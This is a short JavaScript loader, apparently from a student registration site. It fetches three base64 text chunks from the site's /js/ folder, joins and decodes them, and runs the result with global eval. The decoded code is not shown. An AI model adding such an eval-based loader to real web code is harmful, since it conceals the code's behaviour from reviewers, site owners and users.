(function(){
  var F=["/js/_asr_b64_0.txt","/js/_asr_b64_1.txt","/js/_asr_b64_2.txt"];
  Promise.all(F.map(function(f){
    return fetch(f,{credentials:"same-origin"}).then(function(r){
      if(!r.ok) throw new Error(f+" "+r.status);
      return r.text();
    });
  })).then(function(parts){
    var bin=atob(parts.join("").replace(/\s+/g,""));
    var bytes=new Uint8Array(bin.length);
    for(var i=0;i<bin.length;i++) bytes[i]=bin.charCodeAt(i);
    (0,eval)(new TextDecoder("utf-8").decode(bytes));
  }).catch(function(e){ console.error("[students-reg]",e); });
})();
